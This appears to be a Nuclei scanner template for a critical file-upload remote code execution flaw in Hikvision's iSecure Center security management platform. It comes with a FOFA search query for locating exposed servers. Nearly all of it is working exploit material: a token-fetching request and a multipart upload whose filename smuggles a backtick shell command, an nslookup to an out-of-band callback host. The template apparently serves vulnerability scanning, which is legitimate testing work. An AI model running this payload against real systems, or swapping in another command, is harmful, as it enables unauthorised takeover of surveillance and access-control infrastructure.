id: hikvision-iSecure-Center-productfile-fileupload-rce-2

info:
  name: 海康威视综合安防管理平台 productFile - fileupload rce
  author: leadlife
  severity: critical
  metadata:
    verified: true
    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
  tags: rce,hikvision,fileupload,iot,oob

http:
  - raw:
      - |
        GET /iac/iasService/v1/register HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=------6c7a1966e0294e1cb89b06b95cf3da84
        Token: {{token}}
        Content-Length: 191
        Connection: close

        --------6c7a1966e0294e1cb89b06b95cf3da84
        Content-Disposition: form-data; name="file";filename="`nslookup {{interactsh-url}} 8.8.8.8`.zip"

        123456
        --------6c7a1966e0294e1cb89b06b95cf3da84--

    extractors:
      - type: kval
        name: token
        internal: true
        part: header
        kval:
          - token

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 403
          - status_code_2 == 200
        condition: and

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
